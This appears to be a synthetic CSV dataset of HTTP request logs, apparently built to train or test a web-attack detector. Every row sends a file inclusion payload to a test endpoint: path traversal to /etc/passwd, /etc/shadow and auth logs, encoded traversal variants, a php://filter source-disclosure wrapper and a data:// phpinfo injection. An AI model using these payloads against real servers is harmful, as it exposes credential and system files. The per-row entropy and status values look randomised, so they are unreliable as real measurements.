timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-02T00:49:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.26,3,4,18,0,200,752
2025-01-02T00:50:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.43,15,7,28,0,403,1138
2025-01-02T00:51:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.02,10,5,19,0,200,1100
2025-01-02T00:52:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.0,3,4,18,0,500,795
2025-01-02T00:53:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.09,13,4,36,0,403,768
2025-01-02T00:54:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,3.8,13,6,22,0,403,933
2025-01-02T00:55:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.41,3,4,18,0,403,1103
2025-01-02T00:56:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,3.82,7,1,28,0,403,777
2025-01-02T00:57:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.69,4,1,21,0,200,1114
2025-01-02T00:58:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.02,15,7,28,0,200,945
2025-01-02T00:59:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.62,15,7,28,0,500,1184
2025-01-02T01:00:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.78,4,1,21,0,500,1164
2025-01-02T01:01:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.46,9,5,53,0,403,972
2025-01-02T01:02:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.27,13,4,36,0,403,826
2025-01-02T01:03:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.56,7,1,28,0,403,973
2025-01-02T01:04:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.12,9,5,53,0,500,1152
2025-01-02T01:05:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.06,13,6,24,0,500,1197
2025-01-02T01:06:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.93,13,6,22,0,500,1011
2025-01-02T01:07:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.14,15,7,28,0,500,733
2025-01-02T01:08:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,3.9,10,1,27,0,200,1040
2025-01-02T01:09:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.7,9,5,53,0,403,1109
2025-01-02T01:10:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.54,9,5,53,0,403,1078
2025-01-02T01:11:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.07,13,6,22,0,403,791
2025-01-02T01:12:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.03,13,6,22,0,403,923
2025-01-02T01:13:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.13,10,5,19,0,500,769
2025-01-02T01:14:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.2,13,6,24,0,500,1115
2025-01-02T01:15:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.7,7,1,28,0,403,1041
2025-01-02T01:16:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,3.84,4,1,21,0,500,920
2025-01-02T01:17:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.53,10,1,27,0,500,737
2025-01-02T01:18:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.46,13,6,22,0,200,824
2025-01-02T01:19:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.05,13,6,24,0,403,993
2025-01-02T01:20:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.32,10,5,19,0,403,1186
2025-01-02T01:21:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.47,3,4,18,0,200,955
2025-01-02T01:22:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.78,10,5,19,0,403,1071
2025-01-02T01:23:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.64,7,1,28,0,200,904
2025-01-02T01:24:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.56,13,6,22,0,403,1006
2025-01-02T01:25:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.54,13,4,36,0,500,1018
2025-01-02T01:26:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.29,10,5,19,0,403,972
2025-01-02T01:27:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.51,15,7,28,0,500,718
2025-01-02T01:28:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.25,10,5,19,0,200,949
2025-01-02T01:29:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.06,3,4,18,0,200,865
2025-01-02T01:30:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.73,13,4,36,0,403,970
2025-01-02T01:31:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.55,10,5,19,0,200,943
2025-01-02T01:32:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.64,10,5,19,0,500,981
2025-01-02T01:33:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.57,13,4,36,0,403,871
2025-01-02T01:34:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.39,13,4,36,0,200,852
2025-01-02T01:35:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.76,9,5,53,0,500,756
2025-01-02T01:36:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.22,13,4,36,0,200,909
2025-01-02T01:37:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.46,13,4,36,0,200,837
2025-01-02T01:38:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.03,7,1,28,0,200,1051
2025-01-02T01:39:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.33,4,1,21,0,403,808
2025-01-02T01:40:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.79,15,7,28,0,200,793
2025-01-02T01:41:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,3.91,10,1,27,0,200,986
2025-01-02T01:42:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.17,9,5,53,0,200,893
2025-01-02T01:43:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.01,13,6,24,0,500,726
2025-01-02T01:44:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.31,7,1,28,0,500,867
2025-01-02T01:45:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.28,10,1,27,0,403,943
2025-01-02T01:46:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.47,7,1,28,0,403,980
2025-01-02T01:47:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.72,13,4,36,0,200,991
2025-01-02T01:48:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.27,10,5,19,0,403,831
2025-01-02T01:49:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.94,3,4,18,0,403,1132
2025-01-02T01:50:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,3.94,13,6,24,0,200,1123
2025-01-02T01:51:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.07,15,7,28,0,500,897
2025-01-02T01:52:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.14,13,6,24,0,403,1027
2025-01-02T01:53:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.98,10,1,27,0,200,1058
2025-01-02T01:54:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,3.93,10,1,27,0,500,776
2025-01-02T01:55:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.56,4,1,21,0,200,843
2025-01-02T01:56:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.04,15,7,28,0,200,802
2025-01-02T01:57:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.73,10,1,27,0,200,1193
2025-01-02T01:58:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.51,3,4,18,0,403,949
2025-01-02T01:59:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.34,13,4,36,0,403,1038
2025-01-02T02:00:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,3.88,13,6,22,0,403,853
2025-01-02T02:01:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.43,10,1,27,0,403,1068
2025-01-02T02:02:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.38,10,1,27,0,403,864
2025-01-02T02:03:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.17,13,6,22,0,200,965
2025-01-02T02:04:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.52,13,4,36,0,200,937
2025-01-02T02:05:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.19,10,5,19,0,403,991
2025-01-02T02:06:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.72,3,4,18,0,200,1143
2025-01-02T02:07:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.09,10,5,19,0,403,928
2025-01-02T02:08:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.54,15,7,28,0,403,1035
2025-01-02T02:09:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.44,10,5,19,0,403,1173
2025-01-02T02:10:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.42,4,1,21,0,500,1020
2025-01-02T02:11:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,5.57,15,7,28,0,403,1060
2025-01-02T02:12:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.2,10,5,19,0,200,753
2025-01-02T02:13:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,4.22,9,5,53,0,403,1123
2025-01-02T02:14:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.54,7,1,28,0,200,1169
2025-01-02T02:15:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.76,7,1,28,0,200,1155
2025-01-02T02:16:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,3.98,13,6,22,0,200,1136
2025-01-02T02:17:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.0,10,1,27,0,200,856
2025-01-02T02:18:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.76,13,6,22,0,200,1063
2025-01-02T02:19:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.79,10,5,19,0,500,728
2025-01-02T02:20:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.72,13,6,24,0,500,924
2025-01-02T02:21:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.91,13,6,24,0,500,1146
2025-01-02T02:22:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.38,13,4,36,0,403,706
2025-01-02T02:23:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.72,3,4,18,0,500,760
2025-01-02T02:24:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.49,13,6,24,0,500,766
2025-01-02T02:25:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.15,13,4,36,0,200,814
2025-01-02T02:26:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.76,15,7,28,0,200,918
2025-01-02T02:27:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.32,13,6,22,0,403,1067
2025-01-02T02:28:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.37,10,5,19,0,200,996
2025-01-02T02:29:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.53,13,6,24,0,403,1104
2025-01-02T02:30:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.43,7,1,28,0,403,1157
2025-01-02T02:31:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.92,13,6,22,0,403,747
2025-01-02T02:32:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,3.8,13,6,24,0,500,1128
2025-01-02T02:33:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.31,4,1,21,0,500,1015
2025-01-02T02:34:00Z,offline,GET,http://test/fi?page=../../../../var/log/auth.log,/fi,../../../../var/log/auth.log,28,4.88,15,7,28,0,500,1139
2025-01-02T02:35:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.33,9,5,53,0,200,971
2025-01-02T02:36:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.18,13,4,36,0,500,1150
2025-01-02T02:37:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.73,7,1,28,0,200,800
2025-01-02T02:38:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,5.41,4,1,21,0,200,1033
2025-01-02T02:39:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.12,13,4,36,0,200,844
2025-01-02T02:40:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.76,13,6,22,0,403,1064
2025-01-02T02:41:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.15,3,4,18,0,403,806
2025-01-02T02:42:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.04,3,4,18,0,500,864
2025-01-02T02:43:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,3.99,13,6,22,0,403,1187
2025-01-02T02:44:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,3.96,3,4,18,0,403,1025
2025-01-02T02:45:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.61,3,4,18,0,403,986
2025-01-02T02:46:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.7,3,4,18,0,500,893
2025-01-02T02:47:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.03,13,6,22,0,200,1075
2025-01-02T02:48:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.62,13,6,22,0,200,1075
2025-01-02T02:49:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.32,7,1,28,0,403,999
2025-01-02T02:50:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.04,13,6,24,0,500,1141
2025-01-02T02:51:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.01,13,6,24,0,403,855
2025-01-02T02:52:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.43,3,4,18,0,403,1123
2025-01-02T02:53:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.72,13,6,22,0,403,910
2025-01-02T02:54:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.33,13,6,24,0,403,776
2025-01-02T02:55:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,4.2,13,6,24,0,403,1178
2025-01-02T02:56:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.47,9,5,53,0,500,886
2025-01-02T02:57:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.23,7,1,28,0,403,828
2025-01-02T02:58:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.0,10,1,27,0,200,728
2025-01-02T02:59:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,3.95,7,1,28,0,500,1094
2025-01-02T03:00:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.62,9,5,53,0,403,1007
2025-01-02T03:01:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,4.62,13,6,22,0,403,863
2025-01-02T03:02:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.15,10,5,19,0,500,1187
2025-01-02T03:03:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.53,3,4,18,0,200,825
2025-01-02T03:04:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,4.33,3,4,18,0,200,1035
2025-01-02T03:05:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.89,7,1,28,0,200,742
2025-01-02T03:06:00Z,offline,GET,http://test/fi?page=php://filter/convert.base64-encode/resource=index.php,/fi,php://filter/convert.base64-encode/resource=index.php,53,5.43,9,5,53,0,403,1078
2025-01-02T03:07:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.85,10,5,19,0,200,796
2025-01-02T03:08:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.26,10,5,19,0,500,1194
2025-01-02T03:09:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.13,10,5,19,0,200,1137
2025-01-02T03:10:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.34,7,1,28,0,500,818
2025-01-02T03:11:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.49,10,5,19,0,500,735
2025-01-02T03:12:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.07,10,5,19,0,403,739
2025-01-02T03:13:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.88,10,5,19,0,200,1194
2025-01-02T03:14:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.54,13,4,36,0,500,1015
2025-01-02T03:15:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.66,13,4,36,0,403,951
2025-01-02T03:16:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.98,4,1,21,0,200,1006
2025-01-02T03:17:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.4,13,6,22,0,500,892
2025-01-02T03:18:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.58,10,1,27,0,500,930
2025-01-02T03:19:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.03,13,4,36,0,500,733
2025-01-02T03:20:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.19,7,1,28,0,200,1187
2025-01-02T03:21:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,3.96,10,5,19,0,200,777
2025-01-02T03:22:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,5.61,13,4,36,0,200,1152
2025-01-02T03:23:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.17,13,6,22,0,200,955
2025-01-02T03:24:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.29,10,1,27,0,500,1057
2025-01-02T03:25:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,4.31,10,5,19,0,500,997
2025-01-02T03:26:00Z,offline,GET,http://test/fi?page=/proc/self/environ,/fi,/proc/self/environ,18,5.11,3,4,18,0,403,724
2025-01-02T03:27:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,4.18,10,1,27,0,403,913
2025-01-02T03:28:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.04,4,1,21,0,500,1143
2025-01-02T03:29:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,5.7,13,6,24,0,200,825
2025-01-02T03:30:00Z,offline,GET,http://test/fi?page=../../../../etc/passwd,/fi,../../../../etc/passwd,22,5.06,13,6,22,0,403,1142
2025-01-02T03:31:00Z,offline,GET,http://test/fi?page=../../../../proc/version,/fi,../../../../proc/version,24,3.86,13,6,24,0,403,1057
2025-01-02T03:32:00Z,offline,GET,http://test/fi?page=%2e%2e%2fetc%2fpasswd,/fi,%2e%2e%2fetc%2fpasswd,21,4.16,4,1,21,0,200,733
2025-01-02T03:33:00Z,offline,GET,"http://test/fi?page=data://text/plain,<?php phpinfo();?>",/fi,"data://text/plain,<?php phpinfo();?>",36,4.72,13,4,36,0,200,1153
2025-01-02T03:34:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,3.89,10,1,27,0,403,978
2025-01-02T03:35:00Z,offline,GET,http://test/fi?page=../../../etc/shadow,/fi,../../../etc/shadow,19,5.03,10,5,19,0,200,1158
2025-01-02T03:36:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,5.55,7,1,28,0,200,1028
2025-01-02T03:37:00Z,offline,GET,http://test/fi?page=..%2f..%2f..%2fetc%2fpasswd,/fi,..%2f..%2f..%2fetc%2fpasswd,27,5.74,10,1,27,0,500,1111
2025-01-02T03:38:00Z,offline,GET,http://test/fi?page=..%252f..%252fetc%252fpasswd,/fi,..%252f..%252fetc%252fpasswd,28,4.75,7,1,28,0,403,1129
